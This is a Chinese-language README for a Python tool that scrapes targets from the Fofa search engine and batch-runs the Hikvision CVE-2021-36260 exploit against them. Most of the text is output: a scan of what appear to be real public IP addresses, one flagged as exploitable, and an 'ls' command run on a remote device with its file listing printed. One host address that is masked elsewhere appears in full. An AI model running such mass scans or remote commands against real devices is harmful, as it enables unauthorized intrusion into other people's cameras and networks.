# PocSelenium

Python实现Poc快速测试框架，基于Selenium爬取Fofa目标，批量测试。

## 测试

使用hikvision cve-2021-36260 POC 测试

```
...

[*] Checking remote "2.15.198.30:80"
[i] ETag: "0-a99-1e0"
[+] Remote is not vulnerable (Code: 401)

[*] Checking remote "116.98.124.58:38"
[i] ETag: "0-729-1e0"
[+] Remote is not vulnerable (Code: 401)

[*] Checking remote "***.***.***.***:80"
[i] ETag: "666-746-550a95c4"
[!] Remote is verified exploitable
http://***.***.***.***

[*] Checking remote "46.69.186.67:80"
[i] ETag: "0-11d8-1e1"
[+] Remote is not vulnerable (Code: 401)

[*] Checking remote "122.186.238.112:80"
[i] ETag: "1dc-1e0-587ec4a1"
[-] Could not verify if vulnerable (Code: 500)

[*] Checking remote "211.55.213.209:80"
[-] Cannot establish connection to "211.55.213.209:80"

...

```

```
[afl++ 8b4686e283d0] /mnt # python3 test.py --rhost ***.***.***.*** --cmd ls
[*] Hikvision CVE-2021-36260
[*] PoC by bashis <mcw noemail eu> (2021)
[*] Checking remote "186.52.237.178:80"
[i] ETag: "666-746-550a95c4"
[!] Remote is verified exploitable
N
applib
certs
initrun.sh
pidfile
process
r2_isp_config
sound
webLib

```